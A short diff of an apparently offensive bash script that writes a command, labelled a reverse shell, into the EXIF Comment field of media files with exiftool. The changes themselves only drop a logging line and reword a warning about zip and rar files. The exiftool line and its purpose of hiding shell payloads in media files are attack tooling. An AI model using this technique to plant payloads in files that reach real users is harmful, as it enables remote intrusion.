@@ -87,7 +87,6 @@ file_extension="${filename##*.}"
 
 if contains_element "$file_extension" "$media_compatibility"; then
     echo -e "\e[95mInjecting reverse shell into media file...\e[0m"
-    echo "Executing: exiftool -Comment=\"$command\" \"$filename\""
     exiftool -Comment="$command" "$filename"
     echo -e "\e[95mMedia file command injection method completed.\e[0m"
 elif contains_element "$file_extension" "$text_compatibility"; then
@@ -98,7 +97,7 @@ else
     allowed_extensions=("zip" "rar")  
 
     if contains_element "$file_extension" "${allowed_extensions[*]}"; then
-        echo -e "\e[36mWarning: The file extension '$file_extension' is not in the compatibility lists but is allowed.\e[0m"
+        echo -e "\e[36mWarning: The file extension '$file_extension' is not available at this moment.\e[0m"
     else
         echo -e "\e[91mError: File extension not supported.\e[0m"
         show_help
